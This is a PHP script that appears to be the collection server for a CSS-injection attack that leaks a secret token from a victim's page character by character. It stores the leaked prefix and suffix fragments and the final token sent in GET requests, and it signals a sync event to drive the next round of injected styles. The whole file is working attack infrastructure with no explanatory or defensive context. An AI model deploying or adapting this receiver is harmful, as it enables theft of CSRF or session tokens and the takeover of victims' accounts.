<?php
    $preCharsFile = 'pre.txt';
    $postCharsFile = 'post.txt';
    $leakTokenFile = 'leakToken.txt';
    $syncIdFile = 'sync-id.txt';

    if(isset($_GET['pre'])) {
        if(file_exists($leakTokenFile)) {
            // Stop import and do nothing
        }
        else {
            file_put_contents($preCharsFile, $_GET['pre']);
        }
    }

    if(isset($_GET['post'])) {
        if(file_exists($leakTokenFile)) {
            // Stop import and do nothing
        }
        else {
            file_put_contents($postCharsFile, $_GET['post']);
            $event = new SyncEvent(file_get_contents($syncIdFile));
            $event->fire();
        }
    }

    if(isset($_GET['token'])) {
        file_put_contents($leakTokenFile, $_GET['token']);
        $event = new SyncEvent(file_get_contents($syncIdFile));
        $event->fire();
    }
?>